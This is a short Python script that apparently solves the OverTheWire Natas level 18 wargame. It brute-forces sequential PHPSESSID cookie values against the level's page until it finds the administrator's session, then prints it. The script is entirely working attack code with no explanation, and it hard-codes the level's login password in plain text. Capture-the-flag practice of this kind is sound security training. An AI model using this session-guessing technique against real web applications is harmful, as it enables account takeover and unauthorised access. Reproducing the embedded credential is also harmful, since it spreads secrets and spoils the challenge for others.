#!/bin/python

import requests

url='http://natas18.natas.labs.overthewire.org/index.php'
max_id=640
auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(max_id):
    cookie={'PHPSESSID':str(i)}
    response=requests.get(url, auth=auth, cookies=cookie)
    if 'regular user' not in response.text:
        print('Admin PHPSESSID: ' + str(i))
        print(response.text)
        break
